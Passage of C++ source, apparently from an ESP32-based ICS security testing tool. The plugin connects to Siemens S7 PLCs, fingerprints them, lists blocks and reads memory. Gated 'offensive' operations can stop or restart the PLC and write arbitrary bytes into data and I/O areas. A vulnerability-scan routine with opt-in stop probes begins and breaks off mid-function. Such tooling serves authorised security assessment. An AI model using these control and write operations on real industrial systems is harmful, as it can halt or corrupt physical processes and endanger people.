        rep += PSRAMUtils::createPSRAMString("\",\"status\":\"blocked\",\"error\":\"unsafe_operation_blocked\",\"unsafe_required\":true");
        if (sec_) {
            rep += PSRAMUtils::createPSRAMString(",\"fuzzing_allowed_effective\":");
            rep += PSRAMUtils::createPSRAMString(sec_->isFuzzingAllowed() ? "true" : "false");
            rep += PSRAMUtils::createPSRAMString(",\"block_reason\":\"");
            json_append_escaped(rep, sec_->getFuzzingBlockReason());
            rep += PSRAMUtils::createPSRAMString("\"");
        }
        rep += PSRAMUtils::createPSRAMString("}");
        cJSON_Delete(root);
        out_json = rep;
        return false;
    }

    int sock = -1;
    S7DeviceInfo dev_info;
    uint16_t src_tsap = 0, dst_tsap = 0;
    uint8_t tpdu = 0;
    psram_string attempts_json;
    psram_string err_json;
    bool setup_ok_unused = false;
    psram_string ifkey_json;
    bool ok = s7_connect_setup_best_effort(this, ip, port, timeout_ms, rack, slot,
                                          sock, dev_info, src_tsap, dst_tsap, tpdu,
                                          &setup_ok_unused,
                                          ifkey_json,
                                          attempts_json, err_json);

    const uint64_t t0_ms = (uint64_t)(esp_timer_get_time() / 1000ULL);

    PSRAMAllocator<char> alloc;
    psram_string rep(alloc);
    rep.reserve(2048);
    rep += PSRAMUtils::createPSRAMString("{\"op\":\"");
    rep += PSRAMUtils::createPSRAMString(op);
    rep += PSRAMUtils::createPSRAMString("\",\"target\":\"");
    json_append_escaped(rep, target);
    rep += PSRAMUtils::createPSRAMString("\",\"timeout_ms\":");
    char tb[24]; snprintf(tb, sizeof(tb), "%u", (unsigned)timeout_ms);
    rep += PSRAMUtils::createPSRAMString(tb);

    // Handshake summary
    const bool tcp_connection_ok = ok ||
                                   (!err_json.empty() &&
                                    strstr(err_json.c_str(), "cotp_connection_confirm_failed") != nullptr);
    rep += PSRAMUtils::createPSRAMString(",\"handshake\":{");
    rep += PSRAMUtils::createPSRAMString("\"cotp_connection_confirm_ok\":");
    rep += PSRAMUtils::createPSRAMString(ok ? "true" : "false");
    rep += PSRAMUtils::createPSRAMString(",\"tcp_connection_ok\":");
    rep += PSRAMUtils::createPSRAMString(tcp_connection_ok ? "true" : "false");
    rep += PSRAMUtils::createPSRAMString(",\"interface\":\"");
    json_append_escaped(rep, ifkey_json.empty() ? "AUTO" : ifkey_json.c_str());
    rep += PSRAMUtils::createPSRAMString("\"");
    rep += PSRAMUtils::createPSRAMString(",\"connection_attempts\":");
    rep += attempts_json.empty() ? PSRAMUtils::createPSRAMString("[]") : attempts_json;
    {
        auto tpdu_bytes = [](uint8_t tpdu_code) -> int {
            if (tpdu_code < 7 || tpdu_code > 16) return -1;
            return (int)(1U << tpdu_code);
        };
        const int tb2 = tpdu_bytes(tpdu);
        char tb_buf2[16];
        if (tb2 > 0) snprintf(tb_buf2, sizeof(tb_buf2), "%d", tb2);
        char tsb[220];
        snprintf(tsb, sizeof(tsb),
                 ",\"selected_source_tsap_hex\":\"%04X\",\"selected_destination_tsap_hex\":\"%04X\","
                 "\"selected_tpdu_size_code_hex\":\"%02X\"%s%s",
                 (unsigned)src_tsap, (unsigned)dst_tsap, (unsigned)tpdu,
                 (tb2 > 0 ? ",\"selected_tpdu_size_bytes\":" : ""),
                 (tb2 > 0 ? tb_buf2 : ""));
        rep += PSRAMUtils::createPSRAMString(tsb);
    }
    rep += PSRAMUtils::createPSRAMString("}");

    if (!ok) {
        rep += PSRAMUtils::createPSRAMString(",\"status\":\"failed\",\"error_detail\":");
        rep += err_json.empty() ? PSRAMUtils::createPSRAMString("{\"error\":\"handshake_failed\"}") : err_json;
        rep += PSRAMUtils::createPSRAMString("}");
        cJSON_Delete(root);
        out_json = rep;
        return false;
    }

    bool op_success = true;
    psram_string op_error;

    if (strcmp(op, "protocol_discovery") == 0) {
        // Non-invasive: fingerprint + block inventory + safe read probes (no writes).
        uint32_t max_per_type = 32;
        bool include_dir = true;
        if (auto v = cJSON_GetObjectItem(root, "max_per_type"); v && cJSON_IsNumber(v)) {
            int m = v->valueint;
            if (m < 0) m = 0;
            if (m > 256) m = 256;
            max_per_type = (uint32_t)m;
        }
        if (auto v = cJSON_GetObjectItem(root, "include_block_dir"); v && cJSON_IsBool(v)) include_dir = cJSON_IsTrue(v);

        (void)readSZL(sock, S7::SZL_MODULE_IDENTIFICATION, 0x0001, dev_info);
        (void)readSZL(sock, S7::SZL_COMPONENT_IDENTIFICATION, 0x0001, dev_info);
        (void)readSZL(sock, S7::SZL_CPU_PROTECTION, 0x0004, dev_info);
        (void)readSZL(sock, S7::SZL_CPU_CHARACTERISTICS, 0x0001, dev_info);

        S7BlockCountEntry bc[7];
        psram_string blocks_err;
        bool blocks_ok = s7_list_blocks_counts(sock, bc, blocks_err);

        // Optionally pull some directory entries.
        std::vector<S7BlockItemEntry> db_list, ob_list, fb_list, fc_list, sdb_list;
        psram_string dir_err;
        bool dir_ok = true;
        if (include_dir) {
            psram_string e;
            if (!s7_list_blocks_of_type(sock, 0x41, db_list, e)) { dir_ok = false; dir_err = e; }
            if (dir_ok && !s7_list_blocks_of_type(sock, 0x38, ob_list, e)) { dir_ok = false; dir_err = e; }
            if (dir_ok && !s7_list_blocks_of_type(sock, 0x45, fb_list, e)) { dir_ok = false; dir_err = e; }
            if (dir_ok && !s7_list_blocks_of_type(sock, 0x43, fc_list, e)) { dir_ok = false; dir_err = e; }
            if (dir_ok && !s7_list_blocks_of_type(sock, 0x42, sdb_list, e)) { dir_ok = false; dir_err = e; }
        }

        auto clamp_vec = [&](std::vector<S7BlockItemEntry>& v) {
            if ((uint32_t)v.size() > max_per_type) v.resize((size_t)max_per_type);
        };
        clamp_vec(db_list);
        clamp_vec(ob_list);
        clamp_vec(fb_list);
        clamp_vec(fc_list);
        clamp_vec(sdb_list);

        // Pick a DB for read probe (prefer discovered DBs).
        uint16_t probe_db = 1;
        if (!db_list.empty()) {
            probe_db = db_list[0].number;
        }

        struct Probe { const char* name; uint8_t area; uint16_t db; };
        Probe probes[] = {
            {"m0", 0x83, 0},
            {"i0", 0x81, 0},
            {"q0", 0x82, 0},
            {"db0", 0x84, probe_db},
        };
        // Execute read probes + capability matrix (read-only).
        bool can_read_m0 = false, can_read_i0 = false, can_read_q0 = false, can_read_db0 = false;
        bool can_list_blocks_counts = blocks_ok;
        bool can_list_blocks_dir = include_dir ? dir_ok : false;
        bool can_read_szl = dev_info.szl_read_success;

        psram_string probes_json = PSRAMUtils::createPSRAMString("[");
        for (size_t i = 0; i < sizeof(probes)/sizeof(probes[0]); ++i) {
            std::vector<uint8_t> data;
            psram_string e;
            bool okr = s7_read_var_bytes(this, sock, /*pdu_ref*/(uint16_t)(0x0300 + (uint16_t)i),
                                         probes[i].area, probes[i].db, 0, 1, data, e);
            if (i == 0) can_read_m0 = okr;
            if (i == 1) can_read_i0 = okr;
            if (i == 2) can_read_q0 = okr;
            if (i == 3) can_read_db0 = okr;
            if (i) probes_json += PSRAMUtils::createPSRAMString(",");
            PSRAMAllocator<char> a;
            psram_string one(a);
            one.reserve(160);
            one += PSRAMUtils::createPSRAMString("{\"probe\":\"");
            one += PSRAMUtils::createPSRAMString(probes[i].name);
            one += PSRAMUtils::createPSRAMString("\",\"ok\":");
            one += PSRAMUtils::createPSRAMString(okr ? "true" : "false");
            if (probes[i].area == 0x84) {
                one += PSRAMUtils::createPSRAMString(",\"db\":");
                char nb[16]; snprintf(nb, sizeof(nb), "%u", (unsigned)probes[i].db);
                one += PSRAMUtils::createPSRAMString(nb);
            }
            if (okr && !data.empty()) {
                std::string hex = bytesToHex(data);
                one += PSRAMUtils::createPSRAMString(",\"data_hex\":\"");
                json_append_escaped(one, hex.c_str());
                one += PSRAMUtils::createPSRAMString("\"");
            } else if (!okr && !e.empty()) {
                one += PSRAMUtils::createPSRAMString(",\"error\":");
                one += e;
            }
            one += PSRAMUtils::createPSRAMString("}");
            probes_json += one;
        }
        probes_json += PSRAMUtils::createPSRAMString("]");

        rep += PSRAMUtils::createPSRAMString(",\"status\":\"success\",\"result\":{");
        rep += PSRAMUtils::createPSRAMString("\"device\":{");
        rep += PSRAMUtils::createPSRAMString("\"module_type\":\""); json_append_escaped(rep, dev_info.module_type); rep += PSRAMUtils::createPSRAMString("\",");
        rep += PSRAMUtils::createPSRAMString("\"order_code\":\""); json_append_escaped(rep, dev_info.order_code); rep += PSRAMUtils::createPSRAMString("\",");
        rep += PSRAMUtils::createPSRAMString("\"firmware\":\""); json_append_escaped(rep, dev_info.firmware_version); rep += PSRAMUtils::createPSRAMString("\",");
        rep += PSRAMUtils::createPSRAMString("\"serial\":\""); json_append_escaped(rep, dev_info.serial_number); rep += PSRAMUtils::createPSRAMString("\",");
        char dbuf[160];
        snprintf(dbuf, sizeof(dbuf), "\"pdu_size\":%u,\"max_jobs_calling\":%u,\"max_jobs_called\":%u,\"protection_level\":%u",
                 (unsigned)dev_info.asdu_length, (unsigned)dev_info.max_jobs_calling, (unsigned)dev_info.max_jobs_called, (unsigned)dev_info.protection_level);
        rep += PSRAMUtils::createPSRAMString(dbuf);
        rep += PSRAMUtils::createPSRAMString("},");

        // Block inventory summary
        rep += PSRAMUtils::createPSRAMString("\"blocks\":{");
        rep += PSRAMUtils::createPSRAMString("\"ok\":");
        rep += PSRAMUtils::createPSRAMString(blocks_ok ? "true" : "false");
        if (!blocks_ok) {
            rep += PSRAMUtils::createPSRAMString(",\"error\":");
            rep += blocks_err.empty() ? PSRAMUtils::createPSRAMString("{\"error\":\"list_blocks_failed\"}") : blocks_err;
            rep += PSRAMUtils::createPSRAMString("},");
        } else {
            rep += PSRAMUtils::createPSRAMString(",\"counts\":[");
            for (int i = 0; i < 7; ++i) {
                if (i) rep += PSRAMUtils::createPSRAMString(",");
                char b[96];
                snprintf(b, sizeof(b), "{\"type\":%u,\"name\":\"%s\",\"count\":%u}",
                         (unsigned)bc[i].type, s7_block_type_name(bc[i].type), (unsigned)bc[i].count);
                rep += PSRAMUtils::createPSRAMString(b);
            }
            rep += PSRAMUtils::createPSRAMString("],");

            rep += PSRAMUtils::createPSRAMString("\"dir\":{");
            rep += PSRAMUtils::createPSRAMString("\"requested\":");
            rep += PSRAMUtils::createPSRAMString(include_dir ? "true" : "false");
            rep += PSRAMUtils::createPSRAMString(",\"ok\":");
            rep += PSRAMUtils::createPSRAMString((include_dir && dir_ok) ? "true" : (include_dir ? "false" : "true"));
            if (include_dir && !dir_ok) {
                rep += PSRAMUtils::createPSRAMString(",\"error\":");
                rep += dir_err.empty() ? PSRAMUtils::createPSRAMString("{\"error\":\"list_blocks_of_type_failed\"}") : dir_err;
            } else {
                auto emit_list = [&](const char* k, const std::vector<S7BlockItemEntry>& v) {
                    rep += PSRAMUtils::createPSRAMString(",\"");
                    rep += PSRAMUtils::createPSRAMString(k);
                    rep += PSRAMUtils::createPSRAMString("\":[");
                    for (size_t i = 0; i < v.size(); ++i) {
                        if (i) rep += PSRAMUtils::createPSRAMString(",");
                        char b[96];
                        snprintf(b, sizeof(b), "{\"num\":%u,\"lang\":%u,\"flags\":%u}",
                                 (unsigned)v[i].number, (unsigned)v[i].lang, (unsigned)v[i].flags);
                        rep += PSRAMUtils::createPSRAMString(b);
                    }
                    rep += PSRAMUtils::createPSRAMString("]");
                };
                emit_list("DB", db_list);
                emit_list("OB", ob_list);
                emit_list("FB", fb_list);
                emit_list("FC", fc_list);
                emit_list("SDB", sdb_list);
            }
            rep += PSRAMUtils::createPSRAMString("}},");
        }

        rep += PSRAMUtils::createPSRAMString("\"read_probes\":");
        rep += probes_json;
        rep += PSRAMUtils::createPSRAMString(",\"capabilities\":{");
        rep += PSRAMUtils::createPSRAMString("\"setup_comm\":");
        rep += PSRAMUtils::createPSRAMString(dev_info.setup_comm_success ? "true" : "false");
        rep += PSRAMUtils::createPSRAMString(",\"read_szl\":");
        rep += PSRAMUtils::createPSRAMString(can_read_szl ? "true" : "false");
        rep += PSRAMUtils::createPSRAMString(",\"list_blocks_counts\":");
        rep += PSRAMUtils::createPSRAMString(can_list_blocks_counts ? "true" : "false");
        rep += PSRAMUtils::createPSRAMString(",\"list_blocks_dir\":");
        rep += PSRAMUtils::createPSRAMString(can_list_blocks_dir ? "true" : "false");
        rep += PSRAMUtils::createPSRAMString(",\"read_m0\":");
        rep += PSRAMUtils::createPSRAMString(can_read_m0 ? "true" : "false");
        rep += PSRAMUtils::createPSRAMString(",\"read_i0\":");
        rep += PSRAMUtils::createPSRAMString(can_read_i0 ? "true" : "false");
        rep += PSRAMUtils::createPSRAMString(",\"read_q0\":");
        rep += PSRAMUtils::createPSRAMString(can_read_q0 ? "true" : "false");
        rep += PSRAMUtils::createPSRAMString(",\"read_db0\":");
        rep += PSRAMUtils::createPSRAMString(can_read_db0 ? "true" : "false");
        rep += PSRAMUtils::createPSRAMString("}");
        rep += PSRAMUtils::createPSRAMString(",\"plc_time\":{");
        rep += PSRAMUtils::createPSRAMString("\"status\":\"not_implemented\"");
        rep += PSRAMUtils::createPSRAMString("}");
        rep += PSRAMUtils::createPSRAMString(",\"notes\":{");
        rep += PSRAMUtils::createPSRAMString("\"writes\":\"blocked_by_default\",\"unsafe_required\":true");
        rep += PSRAMUtils::createPSRAMString("}}");
    } else if (strcmp(op, "list_blocks") == 0) {
        S7BlockCountEntry bc[7];
        psram_string e;
        if (!s7_list_blocks_counts(sock, bc, e)) {
            op_success = false;
            op_error = e;
        } else {
            rep += PSRAMUtils::createPSRAMString(",\"status\":\"success\",\"result\":{");
            rep += PSRAMUtils::createPSRAMString("\"counts\":[");
            for (int i = 0; i < 7; ++i) {
                if (i) rep += PSRAMUtils::createPSRAMString(",");
                char b[96];
                snprintf(b, sizeof(b), "{\"type\":%u,\"name\":\"%s\",\"count\":%u}",
                         (unsigned)bc[i].type, s7_block_type_name(bc[i].type), (unsigned)bc[i].count);
                rep += PSRAMUtils::createPSRAMString(b);
            }
            rep += PSRAMUtils::createPSRAMString("]}");
        }
    } else if (strcmp(op, "list_blocks_of_type") == 0) {
        const char* bt = nullptr;
        if (auto v = cJSON_GetObjectItem(root, "block_type"); v && cJSON_IsString(v) && v->valuestring) bt = v->valuestring;
        uint8_t t = s7_block_type_from_str(bt);
        std::vector<S7BlockItemEntry> items;
        psram_string e;
        if (!s7_list_blocks_of_type(sock, t, items, e)) {
            op_success = false;
            op_error = e;
        } else {
            rep += PSRAMUtils::createPSRAMString(",\"status\":\"success\",\"result\":{");
            rep += PSRAMUtils::createPSRAMString("\"block_type\":\"");
            rep += PSRAMUtils::createPSRAMString(bt ? bt : "");
            rep += PSRAMUtils::createPSRAMString("\",\"items\":[");
            for (size_t i = 0; i < items.size(); ++i) {
                if (i) rep += PSRAMUtils::createPSRAMString(",");
                char b[96];
                snprintf(b, sizeof(b), "{\"num\":%u,\"lang\":%u,\"flags\":%u}",
                         (unsigned)items[i].number, (unsigned)items[i].lang, (unsigned)items[i].flags);
                rep += PSRAMUtils::createPSRAMString(b);
            }
            rep += PSRAMUtils::createPSRAMString("]}");
        }
    } else if (strcmp(op, "get_info") == 0) {
        (void)readSZL(sock, S7::SZL_MODULE_IDENTIFICATION, 0x0001, dev_info);
        (void)readSZL(sock, S7::SZL_COMPONENT_IDENTIFICATION, 0x0001, dev_info);
        (void)readSZL(sock, S7::SZL_CPU_PROTECTION, 0x0004, dev_info);
        (void)readSZL(sock, S7::SZL_CPU_CHARACTERISTICS, 0x0001, dev_info);

        rep += PSRAMUtils::createPSRAMString(",\"status\":\"success\",\"device\":{");
        rep += PSRAMUtils::createPSRAMString("\"module_type\":\""); json_append_escaped(rep, dev_info.module_type); rep += PSRAMUtils::createPSRAMString("\",");
        rep += PSRAMUtils::createPSRAMString("\"order_code\":\""); json_append_escaped(rep, dev_info.order_code); rep += PSRAMUtils::createPSRAMString("\",");
        rep += PSRAMUtils::createPSRAMString("\"firmware\":\""); json_append_escaped(rep, dev_info.firmware_version); rep += PSRAMUtils::createPSRAMString("\",");
        rep += PSRAMUtils::createPSRAMString("\"serial\":\""); json_append_escaped(rep, dev_info.serial_number); rep += PSRAMUtils::createPSRAMString("\",");
        char dbuf[128];
        snprintf(dbuf, sizeof(dbuf), "\"pdu_size\":%u,\"max_jobs_calling\":%u,\"max_jobs_called\":%u,\"protection_level\":%u",
                 (unsigned)dev_info.asdu_length, (unsigned)dev_info.max_jobs_calling, (unsigned)dev_info.max_jobs_called, (unsigned)dev_info.protection_level);
        rep += PSRAMUtils::createPSRAMString(dbuf);
        rep += PSRAMUtils::createPSRAMString("}");
    } else if (strcmp(op, "read_szl") == 0) {
        uint16_t szl_id = 0;
        uint16_t szl_index = 0;
        if (auto v = cJSON_GetObjectItem(root, "szl_id"); v && cJSON_IsNumber(v)) szl_id = (uint16_t)v->valueint;
        if (auto v = cJSON_GetObjectItem(root, "szl_index"); v && cJSON_IsNumber(v)) szl_index = (uint16_t)v->valueint;
        bool parsed = false;
        if (szl_id != 0) {
            parsed = readSZL(sock, szl_id, szl_index, dev_info);
        }
        if (!parsed) {
            op_success = false;
            op_error = PSRAMUtils::createPSRAMString("{\"error\":\"szl_read_failed\"}");
        } else {
            rep += PSRAMUtils::createPSRAMString(",\"status\":\"success\",\"result\":{");
            char buf[96];
            snprintf(buf, sizeof(buf), "\"szl_id\":%u,\"szl_index\":%u,", (unsigned)szl_id, (unsigned)szl_index);
            rep += PSRAMUtils::createPSRAMString(buf);
            rep += PSRAMUtils::createPSRAMString("\"device\":{");
            rep += PSRAMUtils::createPSRAMString("\"module_type\":\""); json_append_escaped(rep, dev_info.module_type); rep += PSRAMUtils::createPSRAMString("\",");
            rep += PSRAMUtils::createPSRAMString("\"order_code\":\""); json_append_escaped(rep, dev_info.order_code); rep += PSRAMUtils::createPSRAMString("\",");
            rep += PSRAMUtils::createPSRAMString("\"firmware\":\""); json_append_escaped(rep, dev_info.firmware_version); rep += PSRAMUtils::createPSRAMString("\",");
            rep += PSRAMUtils::createPSRAMString("\"serial\":\""); json_append_escaped(rep, dev_info.serial_number); rep += PSRAMUtils::createPSRAMString("\",");
            snprintf(buf, sizeof(buf), "\"pdu_size\":%u,\"max_jobs_calling\":%u,\"max_jobs_called\":%u,\"protection_level\":%u",
                     (unsigned)dev_info.asdu_length, (unsigned)dev_info.max_jobs_calling, (unsigned)dev_info.max_jobs_called, (unsigned)dev_info.protection_level);
            rep += PSRAMUtils::createPSRAMString(buf);
            rep += PSRAMUtils::createPSRAMString("}}}");
        }
    } else if (strcmp(op, "read_db") == 0 || strcmp(op, "read_area") == 0) {
        uint16_t dbn = 0;
        uint32_t start = 0;
        uint16_t size = 0;
        uint8_t area = 0x84;
        if (auto v = cJSON_GetObjectItem(root, "db"); v && cJSON_IsNumber(v)) dbn = (uint16_t)v->valueint;
        if (auto v = cJSON_GetObjectItem(root, "start"); v && cJSON_IsNumber(v)) start = (uint32_t)v->valuedouble;
        if (auto v = cJSON_GetObjectItem(root, "size"); v && cJSON_IsNumber(v)) size = (uint16_t)v->valueint;
        if (strcmp(op, "read_area") == 0) {
            if (auto v = cJSON_GetObjectItem(root, "area"); v && cJSON_IsString(v) && v->valuestring) {
                uint8_t a = s7_area_from_str(v->valuestring);
                if (a) area = a;
            }
            if (area == 0x84) {
                if (auto v = cJSON_GetObjectItem(root, "db"); v && cJSON_IsNumber(v)) dbn = (uint16_t)v->valueint;
            }
        } else {
            area = 0x84;
        }

        std::vector<uint8_t> data;
        psram_string err;
        if (!s7_read_var_bytes(this, sock, /*pdu_ref*/0x0100, area, dbn, start, size, data, err)) {
            op_success = false;
            op_error = err;
        } else {
            std::string hex = bytesToHex(data);
            rep += PSRAMUtils::createPSRAMString(",\"status\":\"success\",\"result\":{");
            rep += PSRAMUtils::createPSRAMString("\"area\":\"");
            if (area == 0x84) rep += PSRAMUtils::createPSRAMString("db");
            else if (area == 0x81) rep += PSRAMUtils::createPSRAMString("i");
            else if (area == 0x82) rep += PSRAMUtils::createPSRAMString("q");
            else if (area == 0x83) rep += PSRAMUtils::createPSRAMString("m");
            else if (area == 0x1D) rep += PSRAMUtils::createPSRAMString("t");
            else if (area == 0x1C) rep += PSRAMUtils::createPSRAMString("c");
            else rep += PSRAMUtils::createPSRAMString("unknown");
            rep += PSRAMUtils::createPSRAMString("\",");
            char buf[96];
            snprintf(buf, sizeof(buf), "\"db\":%u,\"start\":%u,\"size\":%u,", (unsigned)dbn, (unsigned)start, (unsigned)size);
            rep += PSRAMUtils::createPSRAMString(buf);
            rep += PSRAMUtils::createPSRAMString("\"data_hex\":\"");
            json_append_escaped(rep, hex.c_str());
            rep += PSRAMUtils::createPSRAMString("\"}}");
        }
    } else if (strcmp(op, "plc_stop") == 0 || strcmp(op, "plc_start") == 0 || strcmp(op, "plc_cold_restart") == 0) {
        // Offensive/control operations (gated by SecurityManager + unsafe=true)
        uint8_t mode = 0x00;
        uint8_t func = 0x29; // STOP
        const char* action = "stop";
        if (strcmp(op, "plc_start") == 0) {
            mode = (uint8_t)'H';
            func = 0x28;
            action = "hot_restart";
        } else if (strcmp(op, "plc_cold_restart") == 0) {
            mode = (uint8_t)'C';
            func = 0x28;
            action = "cold_restart";
        }

        psram_string e;
        if (!s7_plc_control(sock, /*pdu_ref*/0x0400, mode, func, e)) {
            op_success = false;
            op_error = e;
        } else {
            rep += PSRAMUtils::createPSRAMString(",\"status\":\"success\",\"result\":{");
            rep += PSRAMUtils::createPSRAMString("\"action\":\"");
            rep += PSRAMUtils::createPSRAMString(action);
            rep += PSRAMUtils::createPSRAMString("\"}");
        }
    } else if (strcmp(op, "write_db") == 0 || strcmp(op, "write_area") == 0) {
        uint16_t dbn = 0;
        uint32_t start = 0;
        uint8_t area = 0x84;
        const char* data_hex = nullptr;
        if (auto v = cJSON_GetObjectItem(root, "db"); v && cJSON_IsNumber(v)) dbn = (uint16_t)v->valueint;
        if (auto v = cJSON_GetObjectItem(root, "start"); v && cJSON_IsNumber(v)) start = (uint32_t)v->valuedouble;
        if (auto v = cJSON_GetObjectItem(root, "data_hex"); v && cJSON_IsString(v) && v->valuestring) data_hex = v->valuestring;
        if (strcmp(op, "write_area") == 0) {
            if (auto v = cJSON_GetObjectItem(root, "area"); v && cJSON_IsString(v) && v->valuestring) {
                uint8_t a = s7_area_from_str(v->valuestring);
                if (a) area = a;
            }
            if (area == 0x84) {
                if (auto v = cJSON_GetObjectItem(root, "db"); v && cJSON_IsNumber(v)) dbn = (uint16_t)v->valueint;
            }
        } else {
            area = 0x84;
        }

        std::vector<uint8_t> bytes;
        if (!parse_hex_bytes(data_hex, bytes)) {
            op_success = false;
            op_error = PSRAMUtils::createPSRAMString("{\"error\":\"invalid_data_hex\"}");
        } else {
            psram_string err;
            if (!s7_write_var_bytes(this, sock, /*pdu_ref*/0x0101, area, dbn, start, bytes, err)) {
                op_success = false;
                op_error = err;
            } else {
                rep += PSRAMUtils::createPSRAMString(",\"status\":\"success\",\"result\":{");
                char buf[96];
                snprintf(buf, sizeof(buf), "\"db\":%u,\"start\":%u,\"size\":%u}", (unsigned)dbn, (unsigned)start, (unsigned)bytes.size());
                rep += PSRAMUtils::createPSRAMString(buf);
            }
        }
    } else {
        op_success = false;
        op_error = PSRAMUtils::createPSRAMString("{\"error\":\"op_not_implemented\"}");
    }

    ::close(sock);

    const uint64_t t1_ms = (uint64_t)(esp_timer_get_time() / 1000ULL);
    rep += PSRAMUtils::createPSRAMString(",\"duration_ms\":");
    snprintf(tb, sizeof(tb), "%llu", (unsigned long long)(t1_ms - t0_ms));
    rep += PSRAMUtils::createPSRAMString(tb);

    if (!op_success) {
        rep += PSRAMUtils::createPSRAMString(",\"status\":\"failed\",\"error_detail\":");
        rep += op_error.empty() ? PSRAMUtils::createPSRAMString("{\"error\":\"operation_failed\"}") : op_error;
    }
    rep += PSRAMUtils::createPSRAMString("}");

    cJSON_Delete(root);
    out_json = rep;
    return op_success;
}

std::string S7Plugin::doVulnerabilityScan(const std::string& target) {
    psram_string target_ps = PSRAMUtils::createPSRAMString(target.c_str());
    psram_string report_ps;
    if (!doVulnerabilityScanPSRAM(target_ps, report_ps)) {
        return std::string{};
    }
    return PSRAMUtils::fromPSRAMString(report_ps);
}

bool S7Plugin::doVulnerabilityScanPSRAM(const psram_string& target,
                                        psram_string& out_report) {
    // Accept either a raw target ("ip[:port]") or the VulnerabilityScanner wrapper:
    // {"target":"ip[:port]","scan_types":[...],"timeout_ms":2000}
    psram_string target_label = target;
    psram_string_vector scan_types;
    PSRAMAllocator<psram_string> st_alloc;
    scan_types = psram_string_vector(st_alloc);
    uint32_t timeout_ms = 3000U;

    if (!target.empty() && target[0] == '{') {
        PSRAMJsonParser::PSRAMContext ctx;
        cJSON* root = PSRAMJsonParser::parseInPSRAM(target.c_str(), target.size());
        if (root) {
            if (auto v = cJSON_GetObjectItem(root, "target"); v && cJSON_IsString(v) && v->valuestring) {
                target_label = PSRAMUtils::createPSRAMString(v->valuestring);
            }
            if (auto v = cJSON_GetObjectItem(root, "timeout_ms"); v && cJSON_IsNumber(v)) {
                double d = v->valuedouble;
                if (d < 200) d = 200;
                if (d > 15000) d = 15000;
                timeout_ms = (uint32_t)d;
            }
            if (auto arr = cJSON_GetObjectItem(root, "scan_types"); arr && cJSON_IsArray(arr)) {
                cJSON* it = nullptr;
                cJSON_ArrayForEach(it, arr) {
                    if (it && cJSON_IsString(it) && it->valuestring) {
                        scan_types.push_back(PSRAMUtils::createPSRAMString(it->valuestring));
                    }
                }
            }
            cJSON_Delete(root);
        }
    }

    auto wants = [&](const char* id) -> bool {
        if (!id) return false;
        // Safe defaults when nothing is specified.
        if (scan_types.empty()) {
            if (strcmp(id, "stop_capability_assessment") == 0) return false;
            if (strcmp(id, "proof_plc_stop") == 0) return false;
            if (strcmp(id, "proof_plc_start") == 0) return false;
            return true;
        }
        for (auto const& s : scan_types) {
            if (s == id) return true;
        }
        return false;
    };

    // Parse target into ip/port
    psram_string ip_ps;
    uint16_t port = 102;
    if (!parseTarget(target_label, ip_ps, port)) {
        scans_fail_++;
        out_report = PSRAMUtils::createPSRAMString("{\"scan\":{\"protocol\":\"s7\",\"status\":\"invalid_target\"},\"findings\":[],\"summary\":{\"critical\":0,\"high\":0,\"medium\":0,\"low\":0,\"info\":0}}");
        return false;
    }

    // Best-effort: track which netif is up for reporting purposes.
    const char* ifkey = "AUTO";
    {
        esp_netif_ip_info_t ip_info{};
        esp_netif_t* netif = esp_netif_get_handle_from_ifkey("ETH_DEF");
        if (netif && esp_netif_get_ip_info(netif, &ip_info) == ESP_OK && ip_info.ip.addr != 0) {
            ifkey = "ETH_DEF";
        } else {
            netif = esp_netif_get_handle_from_ifkey("WIFI_STA_DEF");
            if (netif && esp_netif_get_ip_info(netif, &ip_info) == ESP_OK && ip_info.ip.addr != 0) {
                ifkey = "WIFI_STA_DEF";
            }
        }
    }

    const uint64_t t0_ms = (uint64_t)(esp_timer_get_time() / 1000ULL);

    // Use best-effort ISO-on-TCP TSAP strategy: always try rack0/slot0 and rack0/slot2 families.
    uint16_t rack = 0, slot = 2;
    if (cfg_) {
        auto m = cfg_->getProtocolConfig(ProtocolType::S7_COMM);
        auto it_r = m.find(PSRAMUtils::createPSRAMString("rack"));
        auto it_s = m.find(PSRAMUtils::createPSRAMString("slot"));
        if (it_r != m.end()) rack = (uint16_t)atoi(it_r->second.c_str());
        if (it_s != m.end()) slot = (uint16_t)atoi(it_s->second.c_str());
    }

    int sock = -1;
    S7DeviceInfo dev_info;
    uint16_t src_tsap = 0, dst_tsap = 0;
    uint8_t tpdu = 0;
    bool setup_ok = false;
    psram_string attempts_json;
    psram_string err_json;
    psram_string ifkey_json;
    bool ok = s7_connect_setup_best_effort(this,
                                          std::string(ip_ps.c_str()),
                                          port,
                                          timeout_ms,
                                          rack,
                                          slot,
                                          sock,
                                          dev_info,
                                          src_tsap,
                                          dst_tsap,
                                          tpdu,
                                          &setup_ok,
                                          ifkey_json,
                                          attempts_json,
                                          err_json);
    if (!ok) {
        scans_fail_++;
        PSRAMAllocator<char> alloc;
        psram_string rep(alloc);
        rep.reserve(512);
        rep += PSRAMUtils::createPSRAMString("{\"scan\":{\"protocol\":\"s7\",\"status\":\"handshake_failed\",\"target\":\"");
        json_append_escaped(rep, ip_ps.c_str());
        rep += PSRAMUtils::createPSRAMString("\",\"port\":");
        char pb[16]; snprintf(pb, sizeof(pb), "%u", (unsigned)port);
        rep += PSRAMUtils::createPSRAMString(pb);
        rep += PSRAMUtils::createPSRAMString(",\"connection_attempts\":");
        rep += attempts_json.empty() ? PSRAMUtils::createPSRAMString("[]") : attempts_json;
        rep += PSRAMUtils::createPSRAMString(",\"error_detail\":");
        rep += err_json.empty() ? PSRAMUtils::createPSRAMString("{\"error\":\"handshake_failed\"}") : err_json;
        rep += PSRAMUtils::createPSRAMString("},\"findings\":[],\"summary\":{\"critical\":0,\"high\":0,\"medium\":0,\"low\":0,\"info\":0}}");
        out_report = rep;
        return false;
    }

    // Discovery / fingerprint (best-effort; keep report even on partial failures).
    if (setup_ok) {
        // Read only what is requested (or required for derived checks)
        const bool want_fp = wants("fingerprint_szl") || wants("unauthenticated_info");
        const bool want_prot = wants("protection_level") || wants("unauthenticated_info") || wants("stop_capability_assessment");
        if (want_fp) {
            (void)readSZL(sock, S7::SZL_MODULE_IDENTIFICATION, 0x0001, dev_info);
            (void)readSZL(sock, S7::SZL_COMPONENT_IDENTIFICATION, 0x0001, dev_info);
        }
        if (want_prot) {
            (void)readSZL(sock, S7::SZL_CPU_PROTECTION, 0x0004, dev_info);
        }
    }

    // Findings
    PSRAMAllocator<psram_string> f_alloc;
    psram_string_vector findings(f_alloc);
    uint32_t sev_critical = 0, sev_high = 0, sev_medium = 0, sev_low = 0, sev_info = 0;

    auto bump = [&](const char* sev) {
        if (!sev) return;
